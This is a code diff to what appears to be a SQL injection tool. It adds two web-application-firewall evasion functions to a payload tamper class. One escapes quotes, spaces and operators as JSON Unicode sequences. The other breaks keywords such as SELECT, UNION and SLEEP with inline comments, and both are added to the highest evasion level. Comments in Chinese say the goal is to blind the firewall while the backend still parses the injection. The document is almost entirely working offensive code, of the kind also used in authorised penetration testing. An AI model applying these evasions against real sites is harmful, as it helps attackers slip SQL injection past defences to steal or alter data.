@@ -52,6 +52,8 @@ class PayloadTamperMixin:
             TamperProfile("urlencode", "Double URL Encode", self._tamper_urlencode),
             TamperProfile("between", "Replaces > with BETWEEN", self._tamper_between),
             TamperProfile("version_comment", "MySQL inline comment", self._tamper_version_comment),
+            TamperProfile("json_unicode", "JSON Unicode Escape", self._tamper_json_unicode),
+            TamperProfile("concat_bypass", "String concatenation bypass", self._tamper_concat_bypass),
         ]
 
     def apply_tamper(self, payload: str, evasion_level: int = 0) -> list[str]:
@@ -73,7 +75,7 @@ class PayloadTamperMixin:
             tampered_payloads.append(p)
             tampered_payloads.append(self._tamper_version_comment(payload))
 
-        # 高混淆: 雙重編碼 + 組合拳
+        # 高混淆: 雙重編碼 + 組合拳 + JSON Unicode + 拼接繞過
         if evasion_level >= 3:
             p = self._tamper_space2comment(payload)
             p = self._tamper_urlencode(p)
@@ -81,6 +83,13 @@ class PayloadTamperMixin:
 
             p2 = self._tamper_between(payload)
             tampered_payloads.append(p2)
+
+            # 新增高階黑盒 WAF 繞過
+            p3 = self._tamper_json_unicode(payload)
+            tampered_payloads.append(p3)
+
+            p4 = self._tamper_space2comment(self._tamper_concat_bypass(payload))
+            tampered_payloads.append(p4)
 
         return list(set(tampered_payloads))
 
@@ -113,6 +122,42 @@ class PayloadTamperMixin:
     def _tamper_version_comment(self, payload: str) -> str:
         """UNION SELECT -> /*!UNION*/ SELECT"""
         return payload.replace("UNION", "/*!UNION*/").replace("SELECT", "/*!SELECT*/")
+
+    def _tamper_json_unicode(self, payload: str) -> str:
+        """
+        避免 WAF 直接比對字串，將單引號、雙引號、空格等轉換為 JSON/JS 的 Unicode escape
+        例如: ' OR 1=1 -> \u0027\u0020OR\u00201=1
+        主要用於注入在 JSON Body 時，讓 WAF 看不懂，但後端 JSON parser 能成功還原。
+        """
+        escaped_payload = ""
+        for char in payload:
+            if char in ("'", '"', ' ', '<', '>', '=', '(', ')'):
+                escaped_payload += f"\\u{ord(char):04x}"
+            else:
+                escaped_payload += char
+        return escaped_payload
+
+    def _tamper_concat_bypass(self, payload: str) -> str:
+        """
+        String concatenation bypass for keywords
+        替換敏感關鍵字 (SELECT, UNION, FROM) 讓它們被分段
+        這裡使用通用的註解混淆來打斷關鍵字，使 WAF signature match 失敗
+        SELECT -> SE/**/LECT
+        """
+        import re
+        patterns = {
+            r'(?i)\bSELECT\b': 'SE/**/LECT',
+            r'(?i)\bUNION\b': 'UN/**/ION',
+            r'(?i)\bFROM\b': 'FR/**/OM',
+            r'(?i)\bWHERE\b': 'WH/**/ERE',
+            r'(?i)\bADMIN\b': 'AD/**/MIN',
+            r'(?i)\bSLEEP\b': 'SL/**/EEP',
+            r'(?i)\bDELAY\b': 'DE/**/LAY'
+        }
+        tampered = payload
+        for pattern, replacement in patterns.items():
+            tampered = re.sub(pattern, replacement, tampered)
+        return tampered
 
 
 class PayloadWrapperEncoder(PayloadTamperMixin):
